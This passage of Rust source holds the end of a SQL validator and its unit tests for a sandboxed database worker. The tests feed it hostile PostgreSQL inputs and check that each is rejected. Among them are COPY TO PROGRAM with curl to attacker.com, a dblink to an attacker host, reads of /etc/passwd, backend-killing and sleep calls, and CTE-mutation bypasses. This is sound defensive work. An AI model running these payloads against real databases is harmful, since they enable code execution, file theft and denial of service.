    // backend-killing / dblink functions. The walk runs AFTER the
    // statement-level deny-list (so canonical errors take precedence)
    // but BEFORE the allowlist check (so a SELECT with
    // `pg_read_server_files` fails even when SELECT is the only
    // permitted operation). See `check_disallowed_functions` for the
    // schema-qualification handling and trade-off notes.
    check_disallowed_functions(stmt)?;

    // Check for CTE mutations hidden inside SELECT queries
    if let Statement::Query(query) = stmt {
        check_cte_mutations(query, allowed_operations)?;
    }

    // M-3 (2026-05-22): empty allowlist no longer means "anything
    // non-DDL goes". Under `DenyMutations`, only SELECT / EXPLAIN
    // pass when the allowlist is empty — every mutation requires an
    // explicit grant in the JobRequest. Legacy permissive behaviour
    // is gated behind `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1`.
    if stmt_type != "SELECT" && stmt_type != "EXPLAIN" {
        if allowed_operations.is_empty() {
            match empty_policy {
                EmptyAllowlistPolicy::DenyMutations => {
                    return Err(SqlValidationError::DisallowedOperation(
                        stmt_type.to_string(),
                    ));
                }
                EmptyAllowlistPolicy::AllowAllNonDdl => {
                    // Fall through — legacy permissive mode admits.
                }
            }
        } else {
            let permitted = allowed_operations
                .iter()
                .any(|op| op.eq_ignore_ascii_case(stmt_type));
            if !permitted {
                return Err(SqlValidationError::DisallowedOperation(
                    stmt_type.to_string(),
                ));
            }
        }
    }

    Ok(ValidatedStmt {
        stmt_type: stmt_type.to_string(),
        returns_rows: statement_returns_rows(stmt),
    })
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn select_always_allowed() {
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).is_ok());
    }

    #[test]
    fn insert_allowed_when_in_allowlist() {
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).is_ok());
    }

    #[test]
    fn insert_blocked_when_not_in_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let err = validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedOperation(_)));
    }

    #[test]
    fn ddl_always_blocked() {
        assert!(matches!(
            validate_sql("CREATE TABLE t (id INT)", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("ALTER TABLE users ADD COLUMN x TEXT", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("TRUNCATE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn multi_statement_blocked() {
        assert!(matches!(
            validate_sql("SELECT 1; DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::MultipleStatements
        ));
    }

    #[test]
    fn invalid_sql_rejected() {
        assert!(matches!(
            validate_sql("NOT VALID SQL AT ALL ???", &[]).unwrap_err(),
            SqlValidationError::ParseError(_)
        ));
    }

    #[test]
    fn comments_in_valid_sql_are_fine() {
        // The AST parser handles comments correctly — they don't affect security
        assert!(validate_sql("SELECT /* comment */ 1", &[]).is_ok());
        assert!(validate_sql("SELECT 1 -- inline comment", &[]).is_ok());
    }

    #[test]
    fn update_and_delete_with_allowlist() {
        let ops = vec!["UPDATE".to_string(), "DELETE".to_string()];
        assert!(validate_sql("UPDATE t SET x = $1 WHERE id = $2", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = $1", &ops).is_ok());
    }

    /// M-3 (2026-05-22): under the new default policy
    /// (`DenyMutations`), an empty allowlist permits SELECT/EXPLAIN
    /// only. Mutation statements are rejected as `DisallowedOperation`.
    #[test]
    fn empty_allowlist_denies_mutations_by_default() {
        assert!(matches!(
            validate_sql("INSERT INTO t (a) VALUES ($1)", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "INSERT"
        ));
        assert!(matches!(
            validate_sql("UPDATE t SET x = $1", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "UPDATE"
        ));
        assert!(matches!(
            validate_sql("DELETE FROM t WHERE id = $1", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(s) if s == "DELETE"
        ));
        // SELECT / EXPLAIN still pass under the default.
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        assert!(validate_sql("EXPLAIN SELECT 1", &[]).is_ok());
    }

    /// Legacy permissive behaviour is reachable via the explicit
    /// policy override (operators set
    /// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1` to flip the env-based
    /// default).
    #[test]
    fn empty_allowlist_permissive_policy_allows_mutations() {
        let p = EmptyAllowlistPolicy::AllowAllNonDdl;
        assert!(validate_sql_with_policy("INSERT INTO t (a) VALUES ($1)", &[], p).is_ok());
        assert!(validate_sql_with_policy("UPDATE t SET x = $1", &[], p).is_ok());
        assert!(validate_sql_with_policy("DELETE FROM t WHERE id = $1", &[], p).is_ok());
    }

    /// CALL / MERGE — newer mutation surfaces. Under the default
    /// policy they're treated like INSERT/UPDATE/DELETE.
    #[test]
    fn empty_allowlist_denies_call_and_merge() {
        assert!(matches!(
            validate_sql("CALL my_procedure($1, $2)", &[]).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
        // MERGE syntax can be PostgreSQL or Snowflake-dialect — both
        // should hit the same gate.
        let merge_sql =
            "MERGE INTO target USING src ON target.id = src.id WHEN MATCHED THEN UPDATE SET val = src.val";
        // sqlparser may or may not parse this in PostgreSqlDialect; if
        // it does, we want DisallowedOperation, if not, ParseError —
        // both are fail-closed.
        let res = validate_sql(merge_sql, &[]);
        assert!(matches!(
            res.unwrap_err(),
            SqlValidationError::DisallowedOperation(_) | SqlValidationError::ParseError(_)
        ));
    }

    /// Explicit allowlist still works as documented: listed types
    /// pass, unlisted are rejected.
    #[test]
    fn explicit_allowlist_overrides_default() {
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).is_ok());
        // UPDATE not in the list — denied even though INSERT is.
        assert!(matches!(
            validate_sql("UPDATE t SET x = $1", &ops).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
    }

    #[test]
    fn complex_select_with_subquery() {
        assert!(validate_sql(
            "SELECT * FROM (SELECT id, name FROM users WHERE active = true) t WHERE t.id > $1",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn select_with_union() {
        assert!(validate_sql("SELECT id FROM users UNION ALL SELECT id FROM admins", &[]).is_ok());
    }

    #[test]
    fn cte_select_allowed() {
        assert!(validate_sql(
            "WITH active AS (SELECT * FROM users WHERE active = true) SELECT * FROM active",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn grant_blocked() {
        assert!(matches!(
            validate_sql("GRANT ALL ON users TO public", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn explain_allowed_by_default() {
        // EXPLAIN is read-only — useful for query optimization
        assert!(validate_sql("EXPLAIN SELECT 1", &[]).is_ok());
    }

    #[test]
    fn returns_correct_statement_type() {
        // Mutation classifications round-trip through the validator
        // with an explicit allowlist for each type (the post-M-3
        // default rejects empty-allowlist mutations).
        assert_eq!(validate_sql("SELECT 1", &[]).unwrap().stmt_type, "SELECT");
        assert_eq!(
            validate_sql("INSERT INTO t (a) VALUES (1)", &["INSERT".to_string()])
                .unwrap()
                .stmt_type,
            "INSERT"
        );
        assert_eq!(
            validate_sql("UPDATE t SET a = 1", &["UPDATE".to_string()])
                .unwrap()
                .stmt_type,
            "UPDATE"
        );
        assert_eq!(
            validate_sql("DELETE FROM t WHERE id = 1", &["DELETE".to_string()])
                .unwrap()
                .stmt_type,
            "DELETE"
        );
    }

    // MCP-578: AST-based `returns_rows` detection. Pre-fix the worker
    // used a substring `.contains("RETURNING")` check on the raw SQL,
    // which false-positived on string literals and identifier
    // substrings. The false-positive caused the controller to wrap
    // the DML in a CTE that Postgres rejected with "WITH query has
    // no RETURNING clause" — the operator's INSERT never ran.
    #[test]
    fn returns_rows_select() {
        assert!(validate_sql("SELECT 1", &[]).unwrap().returns_rows);
        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).unwrap().returns_rows);
    }

    #[test]
    fn returns_rows_insert_with_returning() {
        let ops = vec!["INSERT".to_string()];
        let v = validate_sql("INSERT INTO t (a) VALUES ($1) RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_insert_without_returning_is_false() {
        let v = validate_sql("INSERT INTO t (a) VALUES ($1)", &["INSERT".to_string()]).unwrap();
        assert!(!v.returns_rows, "INSERT without RETURNING should not return rows");
    }

    #[test]
    fn returns_rows_insert_with_returning_substring_in_string_literal_is_false() {
        // The historical false-positive: substring "RETURNING" appears
        // inside a string literal but the actual statement has NO
        // RETURNING clause. Pre-fix the worker's
        // `sql.to_uppercase().contains("RETURNING")` returned true →
        // controller CTE-wrapped → PG rejected → INSERT never ran.
        // AST-based detection sees no Returning node in the Insert
        // AST and correctly returns false.
        let v = validate_sql(
            "INSERT INTO logs (msg) VALUES ('user returning home')",
            &["INSERT".to_string()],
        )
        .unwrap();
        assert!(
            !v.returns_rows,
            "string-literal 'returning' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_returning_substring_in_identifier_is_false() {
        // Identifier-substring false positive: column name happens to
        // contain "RETURNING" but no actual RETURNING clause.
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql(
            "UPDATE users SET returning_user_count = 1 WHERE id = $1",
            &ops,
        )
        .unwrap();
        assert!(
            !v.returns_rows,
            "identifier substring 'returning_user_count' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_real_returning() {
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql("UPDATE t SET a = $1 WHERE id = $2 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_with_real_returning() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_without_returning_is_false() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1", &ops).unwrap();
        assert!(!v.returns_rows);
    }

    #[test]
    fn returns_rows_explain_is_true() {
        // EXPLAIN returns analysis output rows; should route as fetch.
        let v = validate_sql("EXPLAIN SELECT 1", &[]).unwrap();
        assert!(v.returns_rows);
    }

    // MCP-472: unconditional deny-list. Each statement type below
    // parses successfully through sqlparser-rs 0.53 but had no entry
    // in `statement_type()` and therefore fell to "UNKNOWN" — which
    // (a) is NOT in `is_ddl`, (b) is NOT "SELECT", so under the
    // documented "empty allowlist = no restriction beyond DDL"
    // contract it passed through the validator and reached the
    // database. Each example below is reachable from a WASM module
    // with Database capability + empty `allowed_sql_operations`.

    #[test]
    fn copy_to_program_is_unconditionally_blocked() {
        // PostgreSQL `COPY ... TO PROGRAM 'cmd'` = arbitrary shell
        // command on the database host (well-known RCE vector). Must
        // be rejected regardless of allowlist content.
        for ops in [vec![], vec!["SELECT".to_string(), "INSERT".to_string()]] {
            let err =
                validate_sql("COPY secrets TO PROGRAM 'curl https://attacker.com/'", &ops)
                    .unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "COPY"),
                other => panic!("expected AlwaysBlocked(COPY), got {:?}", other),
            }
        }
    }

    #[test]
    fn copy_from_file_is_unconditionally_blocked() {
        // `COPY ... FROM '/etc/passwd'` = arbitrary file read on the
        // database host. Same blanket block.
        let err =
            validate_sql("COPY secrets FROM '/etc/passwd'", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn set_role_is_unconditionally_blocked() {
        // `SET ROLE` can pivot to a higher-privilege Postgres role
        // if the connection has that capability. Block unconditionally.
        for ops in [vec![], vec!["SELECT".to_string()]] {
            let err = validate_sql("SET ROLE postgres", &ops).unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET ROLE"),
                other => panic!("expected AlwaysBlocked(SET ROLE), got {:?}", other),
            }
        }
    }

    #[test]
    fn set_search_path_is_unconditionally_blocked() {
        // search_path manipulation can redirect unqualified table
        // references to attacker-controlled schemas — Postgres
        // privilege-escalation classic.
        let err = validate_sql("SET search_path TO public", &[]).unwrap_err();
        match err {
            SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET"),
            other => panic!("expected AlwaysBlocked(SET), got {:?}", other),
        }
    }

    #[test]
    fn listen_and_notify_are_unconditionally_blocked() {
        let err1 = validate_sql("LISTEN sensitive_channel", &[]).unwrap_err();
        assert!(matches!(err1, SqlValidationError::AlwaysBlocked(_)));
        let err2 = validate_sql("NOTIFY foo, 'payload'", &[]).unwrap_err();
        assert!(matches!(err2, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn prepare_execute_deallocate_unconditionally_blocked() {
        // `PREPARE foo AS DELETE FROM secrets; EXECUTE foo` is the
        // classic two-step bypass — the validator sees only EXECUTE
        // later and can't introspect the prepared body.
        assert!(matches!(
            validate_sql("PREPARE p AS SELECT 1", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("EXECUTE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DEALLOCATE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn transaction_control_unconditionally_blocked() {
        // The worker owns transaction boundaries; guest code must not
        // open or close one.
        for sql in &[
            "BEGIN",
            "COMMIT",
            "ROLLBACK",
            "SAVEPOINT s1",
            "RELEASE SAVEPOINT s1",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::AlwaysBlocked(_)),
                "stmt {} should be AlwaysBlocked, got {:?}",
                sql,
                err
            );
        }
    }

    #[test]
    fn discard_and_show_unconditionally_blocked() {
        assert!(matches!(
            validate_sql("DISCARD ALL", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("SHOW data_directory", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn deny_list_does_not_affect_normal_dml() {
        // Sanity: the deny-list addition must NOT regress SELECT /
        // INSERT / UPDATE / DELETE under their normal allowlist
        // semantics.
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        let ops = vec!["INSERT".to_string(), "UPDATE".to_string(), "DELETE".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1)", &ops).is_ok());
        assert!(validate_sql("UPDATE t SET a = 1 WHERE id = 1", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = 1", &ops).is_ok());
    }

    #[test]
    fn select_with_returning_insert() {
        // INSERT ... RETURNING is an INSERT, not a SELECT
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).is_ok());

        // But without INSERT in allowlist, it's blocked
        let ops = vec!["SELECT".to_string()];
        assert!(matches!(
            validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
    }

    // MCP-519: the following DDL variants previously fell to the
    // `_ => "UNKNOWN"` arm of `statement_type` because sqlparser
    // grew them without the validator being updated. Combined with
    // empty `allowed_operations` they bypassed every gate. Pin
    // each one as DDL so an audit reviewer can grep for the
    // regression class.

    #[test]
    fn create_policy_is_ddl_blocked() {
        // PostgreSQL Row Level Security: `CREATE POLICY ... USING (true)`
        // would silently expose every row on an RLS-protected table.
        // sqlparser parses this with PostgreSqlDialect.
        let err = validate_sql(
            "CREATE POLICY everyone ON users FOR SELECT USING (true)",
            &[],
        )
        .unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_policy_is_ddl_blocked() {
        let err = validate_sql("DROP POLICY p ON users", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "DROP POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn alter_policy_is_ddl_blocked() {
        let err = validate_sql("ALTER POLICY p ON users RENAME TO q", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "ALTER POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn create_database_is_ddl_blocked() {
        let err = validate_sql("CREATE DATABASE evil", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE DATABASE must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_function_and_procedure_and_trigger_are_ddl_blocked() {
        for sql in &[
            "DROP FUNCTION add_one(integer)",
            "DROP PROCEDURE compact_table()",
            "DROP TRIGGER trg_audit ON users",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DdlBlocked(_)),
                "{} must be DDL-blocked, got {:?}",
                sql,
                err
            );
        }
    }

    // MCP-519: extension / library loading. RCE class — `LOAD` in
    // PG loads a shared library; INSTALL is the DuckDB variant the
    // parser shares.

    #[test]
    fn load_and_install_are_always_blocked() {
        // `LOAD 'libfoo.so'` loads a Postgres shared lib at runtime.
        let err = validate_sql("LOAD 'libpg_evil.so'", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::AlwaysBlocked(_)),
            "LOAD must be always-blocked, got {:?}",
            err
        );
    }

    // MCP-519: fail-closed on any statement type the validator
    // can't classify. Direct construction of an unknown variant
    // would need parser cooperation; we exercise the contract by
    // looking up SQL that maps to a statement type currently in
    // the deny-list AND verifying behaviour. The defining contract
    // — UnknownStatement IS in the error enum — is sufficient
    // documentation; a future sqlparser bump that introduces a
    // new Statement variant will surface the error in production
    // logs and operators can grep for `UnknownStatement` to find
    // it.

    #[test]
    fn unknown_statement_error_displays_safely() {
        let err = SqlValidationError::UnknownStatement;
        let msg = err.to_string();
        // The display string must explain the fail-closed posture
        // (so operators don't assume a parser bug) and must not
        // leak the unhandled variant name.
        assert!(msg.contains("not classified"));
        assert!(msg.contains("fail-closed"));
    }

    // MCP-554: CTE-mutation bypass via DELETE and via nested CTEs.
    //
    // The original `check_cte_mutations` only matched
    // `SetExpr::Insert` and `SetExpr::Update` at the TOP-LEVEL `with`
    // chain. Two bypass classes:
    //
    //   1. DELETE-in-CTE: sqlparser-rs 0.53 represents
    //      `WITH x AS (DELETE FROM t RETURNING *) SELECT ...` either
    //      as `SetExpr::Delete` (its own variant) or as a Query body
    //      whose body is `Delete`. Either way the original code's
    //      `_ => continue` arm skipped it. A WASM module with an
    //      empty allowlist plus a SELECT-only grant could still
    //      execute DELETE via the CTE wrapper.
    //
    //   2. Nested WITH-with-mutation inside a CTE body or subquery
    //      (`WITH outer AS (WITH inner AS (INSERT ...) SELECT ...)`
    //      or `SELECT * FROM (WITH x AS (INSERT ...) SELECT *) sub`).
    //      The original code never recursed past the top-level
    //      cte_tables.
    //
    // These tests pin the post-fix behaviour. Each one feeds a query
    // that under the pre-fix validator parsed as SELECT and passed
    // through.

    #[test]
    fn cte_delete_is_blocked_with_select_only_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH gone AS (DELETE FROM t WHERE id = $1 RETURNING *) SELECT * FROM gone";
        let result = validate_sql(sql, &ops);
        // The exact error type depends on how sqlparser represents
        // DELETE-in-CTE (parser refusal, or AST shape that
        // statement_type categorizes as DELETE rather than SELECT).
        // Either way the validator MUST reject under SELECT-only
        // allowlist semantics — we just don't pin which arm fires.
        assert!(
            result.is_err(),
            "DELETE-in-CTE must be blocked under SELECT-only allowlist, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_insert_inside_subquery_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql = "SELECT * FROM (WITH b AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM b) sub";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "INSERT in a nested CTE within a subquery must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_update_inside_outer_cte_body_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH outer_cte AS (WITH inner_cte AS (UPDATE t SET x=1 RETURNING *) SELECT * FROM inner_cte) SELECT * FROM outer_cte";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "UPDATE in a nested CTE within another CTE body must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn cte_select_inside_subquery_still_passes() {
        // Tripwire: the deep-walk must NOT regress legitimate nested
        // SELECT-only CTEs.
        let ops: Vec<String> = vec![];
        let sql = "SELECT * FROM (WITH b AS (SELECT 1 AS x) SELECT * FROM b) sub";
        assert!(validate_sql(sql, &ops).is_ok());
    }

    // ────────────────────────────────────────────────────────────────────
    // Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
    // function deny-list. Each test below pins a specific bypass path
    // that the pre-fix validator admitted under empty `allowed_operations`
    // because the statement parsed as a benign SELECT. The errors are
    // `DisallowedFunction` because the function-walk runs before the
    // allowlist gate; this means even a SELECT-only module gets blocked.
    // ────────────────────────────────────────────────────────────────────

    #[test]
    fn pg_sleep_blocked_in_select() {
        // Sleep-the-budget DoS: 8 concurrent `pg_sleep(60)` calls stall
        // the controller's database-RPC semaphore (MAX_IN_FLIGHT=8) for
        // the full statement_timeout window.
        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => {
                assert!(
                    name.contains("pg_sleep"),
                    "error name must reference pg_sleep, got `{name}`"
                );
            }
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
    }

    #[test]
    fn pg_read_server_files_blocked() {
        // Arbitrary host-filesystem read.
        let err = validate_sql(
            "SELECT pg_read_server_files('/etc/passwd', 0, NULL, false)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn pg_terminate_backend_blocked() {
        // Cross-tenant session kill.
        let err = validate_sql("SELECT pg_terminate_backend(12345)", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn dblink_blocked() {
        // dblink bypasses every network-egress control the worker
        // enforces — the connection opens from inside Postgres,
        // sidestepping `EXTERNAL_LLM_HOSTS` and the host allowlist.
        let err = validate_sql(
            "SELECT * FROM dblink('host=attacker.com user=evil', 'SELECT 1') AS t(x int)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn schema_qualified_pg_catalog_form_is_blocked() {
        // The canonical bypass for a hypothetical search_path-based
        // block: explicitly qualifying with `pg_catalog`. The visitor
        // must match the qualified form too.
        let err = validate_sql("SELECT pg_catalog.pg_sleep(60)", &[]).unwrap_err();
        match err {
            SqlValidationError::DisallowedFunction(name) => {
                assert_eq!(
                    name, "pg_catalog.pg_sleep",
                    "schema-qualified form must round-trip in the error"
                );
            }
            other => panic!("expected DisallowedFunction, got {other:?}"),
        }
    }

    #[test]
    fn user_schema_qualified_form_not_matched() {
        // Documented trade-off: the validator can't distinguish
        // `public.pg_sleep` (a user-defined function with the same
        // name) from the stock one without resolving against the
        // catalog. The role-wrap (M-2) is the fence for that case.
        // If a future operator legitimately needs this path blocked
        // they should drop the user function rather than expand the
        // validator's match.
        let result = validate_sql("SELECT public.pg_sleep(60)", &[]);
        // We don't actually want this to be ok in production, but the
        // validator's contract is that ONLY pg_catalog-qualified and
        // unqualified forms are matched. Pin the contract so a future
        // refactor that broadens the match (potentially affecting
        // legitimate user code) shows up as a behaviour change.
        assert!(
            result.is_ok(),
            "user-schema qualified form intentionally not matched; got {result:?}"
        );
    }

    #[test]
    fn function_deny_list_case_insensitive() {
        // PG normalises unquoted identifiers to lower; case games
        // must not bypass the validator.
        for sql in [
            "SELECT PG_SLEEP(1)",
            "SELECT Pg_Sleep(1)",
            "SELECT pG_sLeEp(1)",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "case variant `{sql}` not blocked"
            );
        }
    }

    #[test]
    fn function_deny_list_walks_into_subqueries() {
        // A naive validator that only checks the top-level projection
        // would miss this. The visitor must walk subqueries too.
        let err = validate_sql(
            "SELECT * FROM users WHERE id IN (SELECT pg_terminate_backend(pid) FROM pg_stat_activity)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_walks_into_cte_bodies() {
        // CTE body with a denied function. The CTE-mutation walker
        // checks for INSERT/UPDATE/DELETE; the function walker is
        // separate and must catch this too.
        let err = validate_sql(
            "WITH bad AS (SELECT pg_read_file('/etc/passwd') AS x) SELECT * FROM bad",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_walks_into_join_predicates() {
        // Join ON / WHERE / HAVING all reach via the visitor.
        let err = validate_sql(
            "SELECT * FROM t1 JOIN t2 ON pg_sleep(60) IS NULL",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_walks_into_case_when() {
        // Deeply nested expressions — a future overly-shallow walker
        // would miss this. The visitor pattern is recursive by design.
        let err = validate_sql(
            "SELECT CASE WHEN id > 5 THEN pg_terminate_backend(id) ELSE 0 END FROM users",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_does_not_block_benign_functions() {
        // Sanity: the validator must NOT block common read-only or
        // arithmetic functions. If this test ever fails, the deny-list
        // has been over-broadened.
        for sql in [
            "SELECT count(*) FROM users",
            "SELECT sum(amount) FROM payments",
            "SELECT now()",
            "SELECT json_agg(t) FROM (SELECT * FROM users) t",
            "SELECT current_user",
            "SELECT row_number() OVER (ORDER BY id) FROM events",
            "SELECT lower(name) || '@example.com' FROM users",
        ] {
            let result = validate_sql(sql, &[]);
            assert!(
                result.is_ok(),
                "benign SQL `{sql}` was rejected: {result:?}"
            );
        }
    }

    #[test]
    fn function_deny_list_does_not_block_user_funcs_with_pg_prefix() {
        // Tripwire: deny-list must be an exact match, NOT a `starts_with("pg_")`
        // shortcut that would block legitimate user-defined functions
        // happening to share a name prefix with the stock pg_* catalog.
        let result = validate_sql("SELECT pg_my_custom_business_func(id) FROM t", &[]);
        assert!(
            result.is_ok(),
            "user-defined function with `pg_` prefix was rejected: {result:?}"
        );
    }

    #[test]
    fn function_deny_list_short_circuits_on_first_violation() {
        // Performance contract: the visitor stops at the first hit so
        // a deeply-nested malicious query doesn't pay the full walk.
        // We can't directly observe the short-circuit from the public
        // API, but we can pin that a violation deep in the AST still
        // produces a stable error (no panic on traversal continuation).
        let err = validate_sql(
            "SELECT (SELECT (SELECT (SELECT pg_sleep(60))))",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_runs_before_allowlist_check() {
        // Defense-in-depth ordering: even when the operator grants
        // SELECT, an attempt to call a denied function fails with
        // `DisallowedFunction`, NOT `DisallowedOperation`. This means
        // a SELECT-only module is also protected from the function
        // vector.
        let ops = vec!["SELECT".to_string(), "INSERT".to_string(), "UPDATE".to_string()];
        let err = validate_sql("SELECT pg_sleep(60)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn disallowed_function_error_message_includes_function_name() {
        // Operator UX: the error string must name the function so the
        // operator can find it in their module source.
        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("pg_sleep"),
            "error string must include function name, got `{msg}`"
        );
        assert!(
            msg.contains("deny-list") || msg.contains("denied") || msg.contains("rejected") || msg.contains("unconditional"),
            "error string must signal the denied status, got `{msg}`"
        );
    }
}
